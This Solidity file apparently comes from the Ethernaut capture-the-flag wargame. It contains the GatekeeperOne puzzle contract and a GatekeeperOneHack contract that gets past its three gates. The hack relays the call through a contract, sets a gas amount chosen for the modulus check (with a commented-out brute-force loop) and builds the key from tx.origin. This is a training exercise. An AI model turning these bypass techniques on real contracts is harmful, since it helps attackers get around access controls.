// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GatekeeperOneHack {
  GatekeeperOne gatekeeperOne;

  constructor(GatekeeperOne _gatekeeperOne) {
    gatekeeperOne = _gatekeeperOne;
  }

  function attack() external {
    bytes8 key = _gateKey();
    // for (uint i = 100; i < 500; i++) {
    //   try gatekeeperOne.enter{ gas: 8191 * 10 + i }(key) {
    //     return;
    //   } catch {}
    // }
    gatekeeperOne.enter{ gas: 8191 * 10 + 256 }(key);
  }

  function _gateKey() internal view returns (bytes8) {
    return bytes8(uint64(uint16(uint160(tx.origin))) + (1 << 32));
  }
}